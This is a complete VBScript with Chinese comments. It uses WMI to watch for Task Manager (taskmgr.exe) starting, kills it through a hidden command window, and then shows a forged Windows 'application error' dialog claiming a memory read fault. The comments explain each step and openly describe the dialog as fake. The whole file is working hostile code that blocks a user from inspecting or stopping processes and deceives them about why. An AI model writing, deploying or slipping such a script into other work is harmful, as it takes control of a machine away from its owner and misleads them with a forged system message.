Option Explicit '强制变量声明
On Error Resume Next '如发生错误，继续执行后续代码

Dim strComputer '指定一计算机
Dim objWMIService 'SWbemServices实例
Dim strWQL 'WQL查询语句
Dim objEventSource 'Win32_Process的实例
Dim objEventObject 'SWbemObject实例
Dim str1 '对话框的内容
Dim str2 '对话框的内容
Dim str3 '对话框的内容
Dim Content '对话框的内容
Dim Title '对话框的标题
Dim wshshell 'Wshshell对象



'指定计算机名，圆点代表本地计算机，你也可在引号中
'指定远程计算机，但你必须在该计算机上拥有相应权限

strComputer = "."

'创建一个通往WMI服务的连接，将针对该连接的引用保
'存于objWMIService变量，且指定了一个WMI名称空
'间，即/root/cimv2名称空间
Set objWMIService = GetObject("winmgmts://" & strComputer & "/root/cimv2") 

do '循环进行事件查询

'对事件产生进行监控的WQL语句，WITHIN 1子句表示
'每隔一秒对事件进行查询，以秒为单位。ISA 表示所
'需监控的对象是Win32_Process类，
'TargetInstance.Name = 'taskmgr.exe'表明仅对
'taskmgr.EXE进行监控
strWQL = "SELECT * " & _ 
"FROM __InstanceCreationEvent " & _ 
"WITHIN 1 " & _ 
"WHERE TargetInstance ISA 'Win32_Process' " & _ 
"AND TargetInstance.Name = 'taskmgr.exe'" 

'运行查询语句，启动监控
Set objEventSource = objWMIService.ExecNotificationQuery(strWQL) 

'使脚本处于暂停状态直到程序接收到下一个事件
Set objEventObject = objEventSource.NextEvent()

'生成一个WShshell对象
Set wshshell = CreateObject("WScript.Shell")

'运行命令行工具Kill.EXE来杀掉taskmgr.EXE进程。
'%COMSPEC%环境变量代表CMD.EXE，/C选项使程序
'执行完后退出，参数"0"使命令行窗口隐藏
wshshell.run "%COMSPEC% /C kill.vbs taskmgr.exe",0 

str1 = """0x018f4b79"""&" "&"指令引用的"&" "&"""0x076d5000"""&" "&"内存。该内存不能为"&" "&"""read"""&"。" '事件发生后产生的对话框的内容
str2 = "要终止程序，请单击"&"“"&"确定"&"”"&"。"
str3 = "要调试程序，请单击"&"“"&"取消"&"”"&"。"
Content = Str1 & vbCrLf & vbCrLf & Str2 & vbCrLf & Str3
Title = "taskmgr.EXE - 应用程序错误"

'弹出我们伪造的系统对话框
wshshell.Popup Content,,Title,VbCritical+VbOkCancel

loop '与do语句一起构成循环